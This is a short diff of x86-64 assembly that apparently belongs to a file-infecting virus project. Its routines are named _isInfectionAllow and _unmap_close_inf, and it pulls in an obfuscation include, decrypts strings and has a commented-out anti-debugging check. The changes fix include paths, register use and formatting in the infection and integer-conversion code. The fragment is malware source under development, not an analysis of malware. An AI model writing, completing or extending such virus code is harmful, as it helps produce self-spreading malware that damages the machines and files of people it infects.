@@ -1,4 +1,4 @@
-%include "obf_file.inc"
+%include "srcs/obf_file.inc"
 ;  %include "asm/srcs/pestilence.inc"
 
 bits 64
@@ -13,6 +13,7 @@ _start:
     mov rbp, rsp
 	PUSHA
 	call _map_int_table
+	; call _check_debug
     call _isInfectionAllow
     test rax, rax
     js _final_jmp
@@ -732,7 +733,6 @@ _isInfectionAllow:
 		call _decrypt_str
 		mov rsi, rax
 		pop rdi
-		pop rax
         mov rdx, headerGetLen
         xor r10, r10
         xor r9, r9
@@ -858,7 +858,7 @@ _itoa:
     _itoaLoop:
         cmp rax, 9
         jg _itoaRecursif
-        mov [rsi], ax
+        mov [rsi], byte rax
         add byte [rsi], 48
         inc rsi
         ret
@@ -876,7 +876,7 @@ _itoa:
         call _itoaLoop 
         pop rax
         ret
-mov [rsi + rcx], rax
+		mov [rsi + rcx], rax
 _unmap_close_inf:
 	mov rdi, INF(infection.map_addr)
 	mov rsi, INF(infection.map_size)
